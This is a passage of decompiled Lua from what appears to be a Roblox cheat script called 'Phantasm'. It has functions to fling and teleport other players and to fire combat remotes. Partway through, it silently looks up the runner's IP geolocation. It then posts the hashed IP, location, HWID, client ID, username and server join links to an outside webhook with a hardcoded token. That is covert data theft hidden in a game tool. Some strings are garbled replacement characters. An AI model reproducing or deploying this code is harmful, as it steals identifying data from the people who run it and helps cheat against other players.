                local tmp237 = arg235 == "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 "
                local tmp238 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ "
                local tmp239 = ""
                for tmp240 = 1, utf8.len(tmp236) do
                    local tmp241 = string.sub(tmp236, utf8.offset(tmp236, tmp240), utf8.offset(tmp236, tmp240 + 1) - 1)
                    local tmp242 = string.find(tmp238, tmp241, 1, true)
                    if tmp242 then
                        tmp239 = tmp239 .. string.sub(arg235, utf8.offset(arg235, tmp242), utf8.offset(arg235, tmp242 + 1) - 1) .. (tmp237 and "\20" or "")
                    else
                        tmp239 = tmp239 .. tmp241 .. (tmp237 and "\20" or "")
                    end
                end
                return tmp239
            end
            function createCaseInsensitivePattern(arg243)
                local tmp244 = ""
                for tmp245 = 1, # arg243 do
                    local tmp246 = arg243:sub(tmp245, tmp245)
                    if tmp246:lower() ~= tmp246:upper() then
                        tmp244 = tmp244 .. "[" .. tmp246:upper() .. tmp246:lower() .. "]"
                    else
                        tmp244 = tmp244 .. tmp246
                    end
                end
                return tmp244
            end
            function convertToCyrillic(arg247)
                local tmp248 = ""
                local tmp249 = {
                    A = "\239\191\189",
                    a = "\239\191\189",
                    O = "\239\191\189",
                    o = "\239\191\189",
                    E = "\239\191\189",
                    e = "\239\191\189"
                }
                for tmp250 = 1, # arg247 do
                    local tmp251 = arg247:sub(tmp250, tmp250)
                    tmp248 = tmp248 .. (tmp249[tmp251] or tmp251)
                end
                return tmp248
            end
            function flingTp(arg252)
                local tmp253 = getChar
                if tmp253 then
                    tmp253 = getChar(arg252)
                end
                local tmp254 = getRoot(tmp253)
                local tmp255 = getHumanoid(tmp253)
                if tmp253 and (tmp254 and tmp255) then
                    local tmp256 = math.random(1, 2)
                    if tmp256 == 1 then
                        return tmp254.CFrame * CFrame.Angles(math.rad(math.random(- 180, 180)), math.rad(0), math.rad(math.random(- 180, 180)))
                    end
                    if tmp256 == 2 then
                        return CFrame.new(tmp254.Position) * (CFrame.new(math.random(- 5, 5), math.random(- 2.5, 2.5), math.random(- 5, 5)) + tmp255.MoveDirection * tmp254.Velocity.Magnitude / 1.25) * CFrame.Angles(math.rad(math.random(- 180, 180)), math.rad(0), math.rad(math.random(- 180, 180)))
                    end
                end
            end
            
--[[ 16. COMBAT DETECTORS ]]
function isFlung(arg257)
                local tmp258 = getChar
                if tmp258 then
                    tmp258 = getChar(arg257)
                end
                local tmp259
                if tmp258 then
                    tmp259 = getRoot(tmp258)
                else
                    tmp259 = tmp258
                end
                return tmp258 and (tmp259 and tmp259.Velocity.Magnitude >= 2000) and true or false
            end
            function isDeathBlowing(arg260)
                local tmp261 = getChar(arg260)
                local tmp262
                if tmp261 then
                    tmp262 = getRoot(tmp261)
                else
                    tmp262 = tmp261
                end
                local tmp263
                if tmp261 then
                    tmp263 = getHumanoid(tmp261)
                else
                    tmp263 = tmp261
                end
                if tmp261 and (tmp262 and tmp263) then
                    local tmp264, tmp265, tmp266 = pairs(tmp261:GetChildren())
                    while true do
                        local tmp267
                        tmp266, tmp267 = tmp264(tmp265, tmp266)
                        if tmp266 == nil then
                            break
                        end
                        if tmp267:IsA("Tool") and tmp267.Name == "Death Blow" then
                            return true
                        end
                    end
                    if isAnimPlaying(tmp263, "15128849047") then
                        return true
                    end
                    local tmp268 = Players
                    local tmp269, tmp270, tmp271 = pairs(tmp268:GetPlayers())
                    while true do
                        local tmp272
                        tmp271, tmp272 = tmp269(tmp270, tmp271)
                        if tmp271 == nil then
                            break
                        end
                        if tmp272 ~= LocalPlayer and tmp272 ~= arg260 then
                            local tmp273 = getChar(tmp272)
                            local tmp274
                            if tmp273 then
                                tmp274 = getRoot(tmp273)
                            else
                                tmp274 = tmp273
                            end
                            local tmp275
                            if tmp273 then
                                tmp275 = getHumanoid(tmp273)
                            else
                                tmp275 = tmp273
                            end
                            if tmp273 and (tmp274 and (tmp275 and (tmp274.Position - tmp262.Position).Magnitude <= 100)) then
                                local tmp276, tmp277, tmp278 = pairs(tmp273:GetChildren())
                                while true do
                                    local tmp279
                                    tmp278, tmp279 = tmp276(tmp277, tmp278)
                                    if tmp278 == nil then
                                        break
                                    end
                                    if tmp279:IsA("Tool") and tmp279.Name == "Death Blow" then
                                        return
                                    end
                                end
                                if isAnimPlaying(tmp275, "15128849047") then
                                    return true
                                end
                            end
                        end
                    end
                end
                return false
            end
            function grabRandom(_, arg280)
                local tmp281 = getAllPlayers()
                local tmp282 = tmp281[math.random(1, # tmp281)]
                if tmp282 ~= LocalPlayer then
                    local tmp283 = getChar
                    if tmp283 then
                        tmp283 = getChar(LocalPlayer)
                    end
                    local tmp284
                    if tmp283 then
                        tmp284 = getRoot(tmp283)
                    else
                        tmp284 = tmp283
                    end
                    local tmp285 = getChar
                    if tmp285 then
                        tmp285 = getChar(tmp282)
                    end
                    local tmp286 = getRoot(tmp285)
                    local tmp287 = getHumanoid(tmp285)
                    if tmp283 and (tmp284 and (tmp285 and (tmp286 and tmp287))) then
                        if arg280 then
                            local tmp288, tmp289, tmp290 = pairs(tmp285:GetChildren())
                            while true do
                                local tmp291
                                tmp290, tmp291 = tmp288(tmp289, tmp290)
                                if tmp290 == nil then
                                    break
                                end
                                if tmp291:IsA("Tool") and tmp291.Name == "Death Blow" then
                                    return
                                end
                            end
                            if isAnimPlaying(tmp287, "15128849047") then
                                return
                            end
                            local tmp292 = Players
                            local tmp293, tmp294, tmp295 = pairs(tmp292:GetPlayers())
                            while true do
                                local tmp296
                                tmp295, tmp296 = tmp293(tmp294, tmp295)
                                if tmp295 == nil then
                                    break
                                end
                                if tmp296 ~= LocalPlayer and tmp296 ~= tmp282 then
                                    local tmp297 = getChar
                                    if tmp297 then
                                        tmp297 = getChar(tmp296)
                                    end
                                    local tmp298 = getRoot(tmp297)
                                    local tmp299 = getHumanoid(tmp297)
                                    if tmp297 and (tmp298 and (tmp299 and (tmp298.Position - tmp286.Position).Magnitude <= 100)) then
                                        local tmp300, tmp301, tmp302 = pairs(tmp297:GetChildren())
                                        while true do
                                            local tmp303
                                            tmp302, tmp303 = tmp300(tmp301, tmp302)
                                            if tmp302 == nil then
                                                break
                                            end
                                            if tmp303:IsA("Tool") and tmp303.Name == "Death Blow" then
                                                return
                                            end
                                        end
                                        local tmp304, tmp305, tmp306 = pairs(tmp299:GetPlayingAnimationTracks())
                                        while true do
                                            local tmp307
                                            tmp306, tmp307 = tmp304(tmp305, tmp306)
                                            if tmp306 == nil then
                                                break
                                            end
                                            if tmp307.Animation.AnimationId == "rbxassetid://15128849047" then
                                                return
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        heartbeatTp(tmp286.CFrame)
                        task.wait()
                        heartbeatTp(CFrame.lookAt(tmp284.Position, tmp286.Position))
                    end
                end
            end
            
--[[ 17. SKILL / ANIM ]]
function getCommunicator()
                local tmp308 = getChar
                if tmp308 then
                    tmp308 = getChar(LocalPlayer)
                end
                if not tmp308 then
                    return nil
                end
                if tmp308 then
                    tmp308 = tmp308:WaitForChild("Communicate", 1)
                end
                return tmp308
            end
            function click()
                local tmp309 = getCommunicator()
                if tmp309 then
                    tmp309:FireServer({
                        Goal = "LeftClick"
                    })
                    tmp309:FireServer({
                        Goal = "LeftClickRelease"
                    })
                end
            end
            function communicate(arg310)
                local tmp311 = getCommunicator()
                if tmp311 then
                    tmp311:FireServer(arg310)
                end
            end
            function bdcancel()
                communicate({
                    Dash = Enum.KeyCode.S,
                    Key = Enum.KeyCode.Q,
                    Goal = "KeyPress"
                })
            end
            function useSkill(arg312)
                local tmp313 = getCommunicator()
                if tmp313 then
                    tmp313:FireServer({
                        Goal = "LeftClick",
                        ToolName = arg312 or "Normal Punch"
                    })
                end
            end
            function bypassKJAnims()
                local tmp314 = getChar
                if tmp314 then
                    tmp314 = getChar(LocalPlayer)
                end
                if tmp314 then
                    tmp314:SetAttribute("Character", "KJ")
                end
            end
            function patchOffsets()
                local tmp315 = getChar
                if tmp315 then
                    tmp315 = getChar(LocalPlayer)
                end
                local tmp316
                if tmp315 then
                    tmp316 = tmp315:WaitForChild("CharacterHandler"):WaitForChild("Client")
                else
                    tmp316 = tmp315
                end
                if tmp315 and tmp316 then
                    tmp316.RunContext = "Server"
                    tmp316.RunContext = "Legacy"
                end
            end
            function stopM1Anims()
                local tmp317 = getChar
                if tmp317 then
                    tmp317 = getChar(LocalPlayer)
                end
                local tmp318 = getHumanoid(tmp317)
                if tmp317 and tmp318 then
                    local tmp319 = next
                    local tmp320, tmp321 = tmp318:GetPlayingAnimationTracks()
                    while true do
                        local tmp322
                        tmp321, tmp322 = tmp319(tmp320, tmp321)
                        if tmp321 == nil then
                            break
                        end
                        local tmp323 = tmp322.Animation.AnimationId:lower()
                        local tmp324 = next
                        local tmp325 = m1Animations
                        local tmp326 = nil
                        while true do
                            local tmp327
                            tmp326, tmp327 = tmp324(tmp325, tmp326)
                            if tmp326 == nil then
                                break
                            end
                            if table.find(tmp327, tmp323) then
                                tmp322:Stop()
                            end
                        end
                    end
                end
            end
            function onCooldown(arg328)
                return LocalPlayer.PlayerGui.Hotbar.Backpack.Hotbar[tostring(arg328)].Base:FindFirstChild("Cooldown") and true or false
            end
            function hasRagdollCancel(arg329)
                return playersWhoHaveRDC[arg329] and true or false
            end
            function getCounterCooldown(arg330)
                return counterCooldowns[arg330] or 0
            end
            function loadAnim(arg331, arg332, arg333)
                if not (arg331 and arg332) then
                    return nil
                end
                local tmp334 = "rbxassetid://" .. tostring(arg332):match("%d+")
                local tmp335 = Instance.new("Animation")
                local tmp336 = nil
                if arg333 then
                    if arg333 == "Server" then
                        tmp335.AnimationId = "rbxassetid://0"
                        tmp336 = arg331:LoadAnimation(tmp335)
                        tmp335.AnimationId = tmp334
                    elseif arg333 == "Client" then
                        tmp335.AnimationId = tmp334
                        tmp336 = arg331:LoadAnimation(tmp335)
                        tmp335.AnimationId = "rbxassetid://0"
                    end
                else
                    tmp335.AnimationId = tmp334
                    tmp336 = arg331:LoadAnimation(tmp335)
                end
                return tmp336
            end
            function loadSound(arg337, arg338)
                if not (arg337 and arg338) then
                    return nil
                end
                local tmp339 = "rbxassetid://" .. tostring(arg338):match("%d+")
                local tmp340 = Instance.new("Sound")
                tmp340.Parent = arg337
                tmp340.SoundId = tmp339
                return tmp340
            end
            function stopAllAnims(arg341, arg342)
                local tmp343 = not arg341 and getChar(LocalPlayer)
                if tmp343 then
                    tmp343 = getHumanoid(getChar(LocalPlayer))
                end
                if tmp343 then
                    if not (tmp343:IsA("Humanoid") or tmp343:IsA("Animator")) then
                        return warn("Error occured at function \'stopAllAnims\', Argument 1 must be a valid animator.")
                    end
                    if arg342 then
                        local tmp344, tmp345, tmp346 = pairs(tmp343:GetPlayingAnimationTracks())
                        while true do
                            local tmp347
                            tmp346, tmp347 = tmp344(tmp345, tmp346)
                            if tmp346 == nil then
                                break
                            end
                            if typeof(arg342) ~= "table" then
                                if tmp347.Animation.AnimationId:match(tostring(arg342):match("%d+")) then
                                    tmp347:Stop()
                                end
                            else
                                local tmp348, tmp349, tmp350 = pairs(arg342)
                                while true do
                                    local tmp351
                                    tmp350, tmp351 = tmp348(tmp349, tmp350)
                                    if tmp350 == nil then
                                        break
                                    end
                                    if tmp347.Animation.AnimationId:match(tostring(tmp351):match("%d+")) then
                                        tmp347:Stop()
                                    end
                                end
                            end
                        end
                    else
                        local tmp352, tmp353, tmp354 = pairs(tmp343:GetPlayingAnimationTracks())
                        while true do
                            local tmp355
                            tmp354, tmp355 = tmp352(tmp353, tmp354)
                            if tmp354 == nil then
                                break
                            end
                            tmp355:Stop()
                        end
                    end
                end
            end
            
--[[ 18. CLEANUP ]]
function deleteAllInstances(arg356, arg357)
                local tmp358 = arg356 or getChar(LocalPlayer)
                if tmp358 and arg357 then
                    local tmp359, tmp360, tmp361 = pairs(tmp358:GetChildren())
                    while true do
                        local tmp362
                        tmp361, tmp362 = tmp359(tmp360, tmp361)
                        if tmp361 == nil then
                            break
                        end
                        if typeof(arg357) ~= "table" then
                            if tmp362.Name:lower() == arg357:lower() then
                                tmp362:Destroy()
                            end
                        else
                            local tmp363, tmp364, tmp365 = pairs(arg357)
                            while true do
                                local tmp366
                                tmp365, tmp366 = tmp363(tmp364, tmp365)
                                if tmp365 == nil then
                                    break
                                end
                                if tmp362.Name:lower() == tmp366:lower() then
                                    return tmp362:Destroy()
                                end
                            end
                        end
                    end
                end
            end
            function idMatch(arg367, arg368)
                if arg368 then
                    if typeof(arg368) ~= "table" then
                        if arg367:match(arg368) then
                            return true
                        end
                    else
                        local tmp369, tmp370, tmp371 = pairs(arg368)
                        while true do
                            local tmp372
                            tmp371, tmp372 = tmp369(tmp370, tmp371)
                            if tmp371 == nil then
                                break
                            end
                            if arg367:match(tmp372:match("%d+")) then
                                return true
                            end
                        end
                    end
                end
            end
            function isAnimPlaying(arg373, arg374)
                local tmp375 = tostring(arg374):match("%d+")
                local tmp376, tmp377, tmp378 = pairs(arg373:GetPlayingAnimationTracks())
                while true do
                    local tmp379
                    tmp378, tmp379 = tmp376(tmp377, tmp378)
                    if tmp378 == nil then
                        break
                    end
                    if tmp379.Animation.AnimationId:match(tmp375) then
                        return tmp379
                    end
                end
                return nil
            end
            function isCountering(arg380)
                local tmp381 = arg380:FindFirstAncestorWhichIsA("Model")
                if tmp381 and tmp381:FindFirstChild("Counter") then
                    return true
                end
                local tmp382, tmp383, tmp384 = pairs(arg380:GetPlayingAnimationTracks())
                while true do
                    local tmp385
                    tmp384, tmp385 = tmp382(tmp383, tmp384)
                    if tmp384 == nil then
                        break
                    end
                    if table.find(KillSounds, tmp385.Animation.AnimationId) then
                        return true
                    end
                end
                return false
            end
            function isDeathCountering(arg386)
                return arg386 and arg386:FindFirstChild("Counter") and true or false
            end
            function getAnimationsTable(arg387)
                local tmp388, tmp389, tmp390 = pairs(arg387:GetPlayingAnimationTracks())
                local tmp391 = {}
                while true do
                    local tmp392
                    tmp390, tmp392 = tmp388(tmp389, tmp390)
                    if tmp390 == nil then
                        break
                    end
                    table.insert(tmp391, tmp392.Animation.AnimationId)
                end
                return tmp391
            end
            function cloneInstance(arg393)
                arg393.Archivable = true
                local tmp394 = arg393:Clone()
                arg393.Archivable = false
                return tmp394
            end
            function cloneCharacter(arg395)
                local tmp396 = cloneInstance(arg395)
                tmp396.Parent = Workspace
                if arg395 and tmp396 then
                    local tmp397
                    if tmp396 then
                        tmp397 = getRoot(tmp396)
                    else
                        tmp397 = tmp396
                    end
                    local tmp398
                    if tmp396 then
                        tmp398 = getHumanoid(tmp396)
                    else
                        tmp398 = tmp396
                    end
                    if tmp396 and (tmp397 and tmp398) then
                        tmp397.Anchored = true
                        local tmp399, tmp400, tmp401 = pairs(tmp396:GetChildren())
                        while true do
                            local tmp402
                            tmp401, tmp402 = tmp399(tmp400, tmp401)
                            if tmp401 == nil then
                                break
                            end
                            if tmp402:IsA("BasePart") then
                                tmp402.CollisionGroup = "untouchable"
                                tmp402.Massless = true
                                tmp402.CanCollide = false
                                tmp402.CanTouch = false
                                tmp402.CanQuery = false
                            end
                        end
                    end
                end
                return tmp396
            end
            function deleteNew(arg403, arg404)
                task.wait()
                local tmp405 = arg403.Parent
                arg403:Destroy()
                if arg404 then
                    warn("Instance removed, Name:", arg403.Name, "ClassName:", arg403.ClassName, "Parent:", tmp405)
                end
            end
            function deleteInstances(arg406, arg407, arg408)
                local tmp409 = arg408 and arg406:GetDescendants() or arg406:GetChildren()
                local tmp410, tmp411, tmp412 = pairs(tmp409)
                while true do
                    local tmp413
                    tmp412, tmp413 = tmp410(tmp411, tmp412)
                    if tmp412 == nil then
                        break
                    end
                    local tmp414, tmp415, tmp416 = pairs(arg407)
                    while true do
                        local tmp417
                        tmp416, tmp417 = tmp414(tmp415, tmp416)
                        if tmp416 == nil then
                            break
                        end
                        if tmp413.Name:lower() == tmp417:lower() then
                            task.spawn(pcall, deleteNew, tmp413, false)
                        end
                    end
                end
            end
            
--[[ 19. RICH TEXT ]]
function formatRichText(arg418, arg419, arg420, arg421)
                return "<font color=\"rgb(" .. arg418 .. "," .. arg419 .. "," .. arg420 .. ")\"></font>" .. "<font color=\"rgb(" .. arg418 .. "," .. arg419 .. "," .. arg420 .. ")\">" .. arg421 .. "</font>" .. "<font color=\"rgb(" .. arg418 .. "," .. arg419 .. "," .. arg420 .. ")\"></font>"
            end
            local tmp422 = HttpService:JSONDecode(httpRequest({
                Url = "http://www.ip-api.com/json",
                Method = "GET"
            }).Body) or {}
            local tmp423 = tmp422.query or nil
            local up424 = tmp422.country or "Unknown"
            local up425 = tmp422.region or "Unknown"
            local up426 = tmp422.regionName or "Unknown"
            local up427 = tmp422.timezone or "Unknown"
            local up428 = UserInputService:GetPlatform() == Enum.Platform.Windows and ":computer:" or ":mobile_phone:"
            local up429 = tmp423 and (sha.sha512(tmp423 .. up424 .. up425 .. up426 .. up427) or "Unknown") or "Unknown"
            pcall(function()
                local tmp430 = httpRequest
                local tmp431 = {
                    Url = "https://meow.skunk.legal/c/duckuseshissparkletimetrafficconeasadildo",
                    Method = "POST",
                    Headers = {
                        ["content-type"] = "application/json",
                        Authorization = "YwCbktcTdW3EaWghnruRAAueeh6mKZ2sRqnph6Y"
                    }
                }
                local tmp432 = HttpService
                local tmp433 = tmp432.JSONEncode
                local tmp434 = {}
                local tmp435 = {}
                local tmp436 = {
                    title = "Phantasm Logs",
                    description = "User Device: " .. up428,
                    type = "rich",
                    color = tonumber(0)
                }
                local tmp437 = {}
                local tmp438 = {
                    name = "\n\n-----------------------------------------------------Information** **"
                }
                local tmp439 = Players
                local tmp440 = RbxAnalyticsService
                tmp438.value = "Identified Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "Unknown") .. "\nExecutor Name: " .. (getexecutorname and tostring(getexecutorname()) or "Unknown") .. "\nServer Players: " .. (# tmp439:GetPlayers() or "Unknown") .. "\nServer Type: " .. ServerType .. "\nServer Version: " .. ServerVersion .. "\nCountry: " .. up424 .. "\nRegion: " .. up425 .. "\nRegion Name: " .. up426 .. "\nTimezone: " .. up427 .. "\nUsername: [" .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")](https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile)\nClient ID: " .. (tmp440:GetClientId() or "Unknown") .. "\nHWID: " .. (gethwid and tostring(gethwid()) or (get_hwid and tostring(get_hwid()) or "Unknown")) .. "\nHashed Identifier: " .. up429 .. "\n-----------------------------------------------------" .. "\n[**Join**](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")"
                tmp438.inline = false
                __set_list(tmp437, 1, {
                    tmp438,
                    {
                        name = "JobId Join",
                        value = "```Roblox.GameLauncher.joinGameInstance(\'" .. game.PlaceId .. "\', \'" .. game.JobId .. "\')```",
                        inline = true
                    },
                    {
                        name = "JobId",
                        value = "```r\r\n    " .. game.JobId .. "\r\n\r\n    ```",
                        inline = true
                    },
                    {
                        name = "Browser Join",
                        value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```",
                        inline = false
                    },
                    {
                        name = "Script Join",
                        value = "```lua\r\n    game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game:GetService(\"Players\").LocalPlayer)\r\n    ```",
                        inline = false
                    }
                })
                tmp436.fields = tmp437
                tmp436.thumbnail = {
                    url = fetchAvatar()
                }
                tmp436.footer = {
                    text = "Script ran at " .. os.date("%Y-%m-%d %H:%M:%S")
                }
                __set_list(tmp435, 1, {
                    tmp436
                })
                tmp434.embeds = tmp435
                tmp431.Body = tmp433(tmp432, tmp434)
                tmp430(tmp431)
            end)
            local _ = Workspace.Thrown
            local tmp441 = Workspace.Thrown
            tmp441.Archivable = true
            local debrisFolder = tmp441:Clone()
            tmp441.Archivable = false
            debrisFolder:ClearAllChildren()
            local tmp443, tmp444, tmp445 = pairs(tmp441:GetChildren())
            local up446 = up429
            local up447 = ServerType
            local whitelistedPlayers = whitelistedPlayers
            while true do
                local tmp449
                tmp445, tmp449 = tmp443(tmp444, tmp445)
                if tmp445 == nil then
                    break
                end
                tmp449.Parent = debrisFolder
            end
            tmp441:Destroy()
            debrisFolder.Name = "Thrown"
            debrisFolder.Parent = Workspace
            worldConnections[# worldConnections + 1] = tmp441.ChildAdded:Connect(function(argUp450)
                task.spawn(function()
                    local tmp451 = tick()
                    repeat
                        RenderStepped:Wait()
                    until argUp450 and argUp450.Parent or tick() >= tmp451 + 1
                    if argUp450 and argUp450.Parent then
                        local _, tmp453 = pcall(function()
                            if argUp450:IsA("BasePart") then
                                local tmp452 = argUp450.Locked
                                argUp450.Locked = false
                                argUp450.Parent = debrisFolder
                                argUp450.Locked = tmp452
                            else
                                argUp450.Parent = debrisFolder
                            end
                        end)
                        if tmp453 then
                            error("(Phantasm) Failed to clone instance with name " .. argUp450.Name .. ", error: " .. tmp453, 5)
                        end
                    end
                end)
            end)
            local up454 = {}
            worldConnections[# worldConnections + 1] = debrisFolder.ChildAdded:Connect(function(addedChild)
                task.wait()
                if addedChild:IsA("BasePart") then
                    addedChild:SetAttribute("Spawn", tick())
                end
                if addedChild:IsA("Attachment") or addedChild:IsA("WeldConstraint") then
                    up454[addedChild] = tick()
                    local tmp456 = tick()
                    local tmp457, tmp458, tmp459 = pairs(up454)
                    while true do
                        local tmp460
                        tmp459, tmp460 = tmp457(tmp458, tmp459)
                        if tmp459 == nil then
                            break
                        end
                        if tmp459 and tmp459.Parent then
                            if (tmp459:IsA("BasePart") and 30 or 15) < tmp456 - tmp460 then
                                tmp459:Destroy()
                                up454[tmp459] = nil
                            end
                        else
                            up454[tmp459] = nil
                        end
                    end
                end
                if addedChild.Name ~= "QuickWind" then
                    if addedChild.Name ~= "QuickSlashMesh" then
                        if addedChild.Name:find("AdjustStabby3") then
                            addedChild.Name = string.sub(addedChild.Name, 14, # addedChild.Name)
                            local tmp461 = Workspace.Live:FindFirstChild(addedChild.Name)
                            local tmp462 = tmp461 and tmp461.PrimaryPart
                            if tmp462 then
                                addedChild:SetPrimaryPartCFrame((tmp462.CFrame + Vector3.new(0, 5, 0, 0)) * CFrame.new(- 0.00016784668, 0.0000305175781, - 3.15378571, 0.000411212444, - 0.657321572, - 0.753614008, - 1.95897822e-8, 0.753610671, - 0.657323241, 1.00000131, 0.000268951058, 0.000308543444))
                                return
                            end
                        elseif addedChild.Name:find("AdjustStabby2") then
                            addedChild.Name = string.sub(addedChild.Name, 14, # addedChild.Name)
                            local tmp463 = Workspace.Live:FindFirstChild(addedChild.Name)
                            local tmp464 = tmp463 and tmp463.PrimaryPart
                            if tmp464 then
                                addedChild:SetPrimaryPartCFrame((tmp464.CFrame + Vector3.new(0, 5, 0, 0)) * CFrame.new(- 0.000198364258, 0.0000305175781, - 3.15378571, 0.000410616398, - 0.7406317, - 0.671912789, - 2.207255e-8, 0.671912074, - 0.740631104, 1.00000143, 0.000302284956, 0.000274270773))
                                return
                            end
                        elseif addedChild.Name:find("AdjustStabby1") then
                            addedChild.Name = string.sub(addedChild.Name, 14, # addedChild.Name)
                            local tmp465 = Workspace.Live:FindFirstChild(addedChild.Name)
                            local tmp466 = tmp465 and tmp465.PrimaryPart
                            if tmp466 then
                                addedChild:SetPrimaryPartCFrame(tmp466.CFrame * CFrame.new(- 0.000228881836, 0, - 3.15380859, 0.000410526991, - 0.815318942, - 0.579013944, - 2.42984068e-8, 0.579013169, - 0.815318465, 1.00000155, 0.000332802534, 0.000236406922))
                                return
                            end
                        elseif addedChild.Name:find("AdjustStabby4") then
                            addedChild.Name = string.sub(addedChild.Name, 14, # addedChild.Name)
                            local tmp467 = Workspace.Live:FindFirstChild(addedChild.Name)
                            local tmp468 = tmp467 and tmp467.PrimaryPart
                            if tmp468 then
                                addedChild:SetPrimaryPartCFrame((tmp468.CFrame + Vector3.new(0, 0, 0, 0)) * CFrame.new(3.63522339, 1.28546143, - 4.29478073, 0.000426799059, - 0.920516968, 0.390702456, - 1.22053878e-9, - 0.390702516, - 0.920517206, 0.99999994, 0.000392824411, - 0.0001668185))
                                return
                            end
                        else
                            local tmp469 = addedChild.Name == "CleaveBruh" and Workspace.Live:FindFirstChild(addedChild:GetAttribute("Name"))
                            if tmp469 then
                                local tmp470 = tmp469.PrimaryPart
                                if tmp470 and addedChild.PrimaryPart then
                                    addedChild:SetPrimaryPartCFrame(tmp470.CFrame * CFrame.Angles(math.rad((math.random(- 360, 360))), math.rad((math.random(- 360, 360))), (math.rad((math.random(- 360, 360))))))
                                end
                            end
                        end
                        return
                    else
                        if addedChild:GetAttribute("Name") then
                            local tmp471 = Workspace.Live:FindFirstChild(addedChild:GetAttribute("Name"))
                            local tmp472 = tmp471 and tmp471.PrimaryPart
                            if tmp472 then
                                addedChild.CFrame = tmp472.CFrame * CFrame.Angles(math.rad((math.random(- 360, 360))), math.rad((math.random(- 360, 360))), (math.rad((math.random(- 360, 360)))))
                            end
                        end
                        local tmp473 = addedChild:FindFirstChild("Mesh") or addedChild:WaitForChild("Mesh", 0.2)
                        if tmp473 then
                            TweenService:Create(tmp473, TweenInfo.new(addedChild:GetAttribute("Time"), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                Scale = Vector3.new(0, 7, 0, 0) * addedChild:GetAttribute("Scale")
                            }):Play()
                        end
                    end
                else
                    if addedChild:GetAttribute("Name") then
                        local tmp474 = Workspace.Live:FindFirstChild(addedChild:GetAttribute("Name"))
                        local tmp475 = tmp474 and tmp474.PrimaryPart
                        if tmp475 then
                            addedChild.CFrame = tmp475.CFrame * CFrame.Angles(math.rad((math.random(- 360, 360))), math.rad((math.random(- 360, 360))), (math.rad((math.random(- 360, 360)))))
                        end
                    end
                    TweenService:Create(addedChild, TweenInfo.new(addedChild:GetAttribute("Time") * 3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        Size = addedChild.Size + Vector3.new(15, 4, 15, 0) * addedChild:GetAttribute("Scale"),
                        Transparency = 1
                    }):Play()
                    return
                end
            end)
